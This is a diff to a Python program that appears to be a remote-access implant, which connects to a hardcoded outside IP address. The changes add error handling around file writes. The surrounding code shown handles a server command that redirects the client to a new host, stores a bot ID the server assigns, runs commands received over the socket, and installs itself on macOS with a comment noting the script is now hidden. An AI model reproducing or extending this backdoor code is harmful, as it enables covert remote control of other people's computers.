@@ -19,7 +19,7 @@ try:
 except:
     from io import StringIO
 
-__version__ = "1.2"
+__version__ = "1.2.1"
 
 HOST = '50.159.66.236'
 #HOST = 'localhost'
@@ -496,16 +496,24 @@ def serve(sock,user):
                 if HOST_TRANSFER in recvjson:
                     hostaddr = recvjson[HOST_TRANSFER][0]
                     hostport = int(recvjson[HOST_TRANSFER][1])
-                    with open(HOSTINFOFILE,"w") as hostfile:
-                        hostfile.write(hostaddr + "\n")
-                        hostfile.write(str(hostport))
+                    try:
+                        with open(HOSTINFOFILE,"w") as hostfile:
+                            hostfile.write(hostaddr + "\n")
+                            hostfile.write(str(hostport))
+                    except IOError as e:
+                        sys.stderr.write("[!] Could not write to "+HOSTINFOFILE+"\n")
+                        sys.stderr.write(str(e) + "\n")
                     # Restart
                     RUNNING = False
                 if ASSIGN_ID in recvjson:
                     id = recvjson[ASSIGN_ID]
-                    with open(IDFILE,"w") as idfile:
-                        idfile.write(id + "\n")
-                        idfile.write(user)
+                    try:
+                        with open(IDFILE,"w") as idfile:
+                            idfile.write(id + "\n")
+                            idfile.write(user)
+                    except IOError as e:
+                        sys.stderr.write("[!] Could not write to "+IDFILE+"\n")
+                        sys.stderr.write(str(e)+"\n")
                 # Standard evaluation
                 if STDIN in recvjson:
                     with proclock:
@@ -681,9 +689,12 @@ def install_and_run_osx(host, port):
         return False
     # Install host information
     script_dir = os.path.dirname(script_path)
-    with open(os.path.join(script_dir,HOSTINFOFILE),"w") as f:
-        f.write(host + "\n")
-        f.write(str(port))
+    try:
+        with open(os.path.join(script_dir,HOSTINFOFILE),"w") as f:
+            f.write(host + "\n")
+            f.write(str(port))
+    except IOError:
+        sys.stderr.write("[!] Could not write to " + HOSTINFOFILE)
 
     # Now we have hidden the script
     daemon_loc = None
